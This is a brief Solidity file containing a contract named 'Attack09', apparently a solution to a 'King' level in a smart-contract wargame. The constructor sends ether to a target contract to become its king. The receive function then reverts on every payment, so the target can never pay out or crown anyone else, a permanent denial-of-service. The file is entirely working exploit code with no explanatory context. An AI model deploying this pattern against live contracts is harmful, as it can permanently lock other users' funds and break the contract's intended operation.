// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract Attack09 {
    constructor(address _kingAddress) public payable {
        address(_kingAddress).call{value: msg.value}("");
    }

    receive() external payable {
        revert("I am the King for all eternity!");
    }
}
